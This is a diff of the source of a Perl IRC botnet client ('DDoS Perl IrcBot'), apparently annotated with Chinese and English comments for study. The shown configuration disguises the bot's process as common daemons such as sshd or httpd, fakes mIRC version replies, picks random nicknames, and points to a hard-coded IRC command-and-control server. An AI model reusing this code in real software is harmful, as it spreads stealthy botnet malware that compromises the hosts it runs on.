@@ -2,7 +2,7 @@
 
 ######################################################################################################################
 ######################################################################################################################
-##  DDoS Perl IrcBot v1.0 / 2012 by DDoS Security Team       ## [ Help ] ###########################################
+##  DDoS Perl IrcBot v1.0 / 2012 by DDoS Security Team         ## [ Help ] ###########################################
 ##      Stealth MultiFunctional IrcBot writen in Perl          #######################################################
 ##        Teste on every system with PERL instlled             ##  !u @system                                       ##
 ##                                                             ##  !u @version                                      ##
@@ -32,18 +32,18 @@
 ##### [ Configuration ] #####
 #############################
 
-my @rps = ("/usr/local/apache/bin/httpd -DSSL",
-		   "/usr/sbin/httpd -k start -DSSL",
+my @rps = ("/usr/local/apache/bin/httpd -DSSL",                                                                         # Apache web server
+		   "/usr/sbin/httpd -k start -DSSL",                                                                            #   https://linux.die.net/man/8/httpd
            "/usr/sbin/httpd",
-		   "/usr/sbin/sshd -i",
-		   "/usr/sbin/sshd",
+		   "/usr/sbin/sshd -i",                                                                                         # OpenSSH SSH daemon
+		   "/usr/sbin/sshd",                                                                                            #   https://www.freebsd.org/cgi/man.cgi?sshd(8)
 	       "/usr/sbin/sshd -D",
-           "/usr/sbin/apache2 -k start",
-	       "/sbin/syslogd",
-	       "/sbin/klogd -c 1 -x -x",
-		   "/usr/sbin/acpid",
-		   "/usr/sbin/cron");
-my $process = $rps[rand scalar @rps];
+           "/usr/sbin/apache2 -k start",                                                                                # Apache web server 
+	       "/sbin/syslogd",                                                                                             # Linux system logging utilities ( https://linux.die.net/man/8/syslogd )
+	       "/sbin/klogd -c 1 -x -x",                                                                                    # Kernel Log Daemon (https://linux.die.net/man/8/klogd)
+		   "/usr/sbin/acpid",                                                                                           # Advanced Configuration and Power Interface event daemon (https://linux.die.net/man/8/acpid)
+		   "/usr/sbin/cron");                                                                                           # daemon to execute scheduled commands (https://linux.die.net/man/8/cron)
+my $process = $rps[rand scalar @rps];                                                                                   # 在上述進程中，亂數選擇一個。
 
 my @rversion = ("\001VERSION - unknown command.\001",
 				"\001mIRC v5.91 K.Mardam-Bey\001",
@@ -56,7 +56,7 @@ my @rversion = ("\001VERSION - unknown command.\001",
 				"\001mIRC v6.21 Khaled Mardam-Bey\001",
 				"\001mIRC v6.31 Khaled Mardam-Bey\001",
 				"\001mIRC v7.15 Khaled Mardam-Bey\001");
-my $vers = $rversion[rand scalar @rversion];
+my $vers = $rversion[rand scalar @rversion];                                                                            # 從上述版本中，亂數選擇一個。
 
 my @rircname = ("abbore","ably","abyss","acrima","aerodream","afkdemon","ainthere","alberto","alexia","alexndra",
 				"alias","alikki","alphaa","alterego","alvin","ambra","amed","andjela","andreas","anja",
@@ -117,7 +117,7 @@ my @rircname = ("abbore","ably","abyss","acrima","aerodream","afkdemon","ainther
 				"yenyen","ykbug","yogiebear","zai","zfstr","zinj","zizu","zvezda","zwimou","zwisou",
 				"zwsiew","zwsiewale");
 
-my $ircname = $rircname[rand scalar @rircname];
+my $ircname = $rircname[rand scalar @rircname];                                                                         # 從上述 IRC 的暱稱中，亂數選擇一個，作為 $ircname
 
 ## my @rrealname = ("4,1[ DDoS Security Team ]",
 ## 				    "4,1 /!\ DDoS Security Team /!\ ",
@@ -125,15 +125,15 @@ my $ircname = $rircname[rand scalar @rircname];
 ##                  "2,1---=== 4,1 DDoS Security Team 2,1===---");
 ## chop (my $realname = $rrealname[rand scalar @rrealname]);
 
-chop (my $realname = $rircname[rand scalar @rircname]);
-
+chop (my $realname = $rircname[rand scalar @rircname]);                                                                 # 從上述 IRC 的暱稱中，亂數選擇一個，作為 $realname
+                                                                                                                        # chop() 刪掉最後一個字元
 ## my @nickname = ("DDoS[U]");
 ## my $nick =$nickname[rand scalar @nickname];
 
-my $nick =$rircname[rand scalar @rircname];
+my $nick =$rircname[rand scalar @rircname];                                                                             # 從上述 IRC 的暱稱中，亂數選擇一個，作為 $nick
 
-$server = 'irc.freetools.co' unless $server;
-my $port = '15';
+$server = 'irc.freetools.co' unless $server;                                                                            # unless: 除非條件敘述是對的，否則就執行該程式區塊
+my $port = '15';                                                                                                        # 制定 IRC 連線的 Port
 
 my $linas_max='8';
 my $sleep='5';
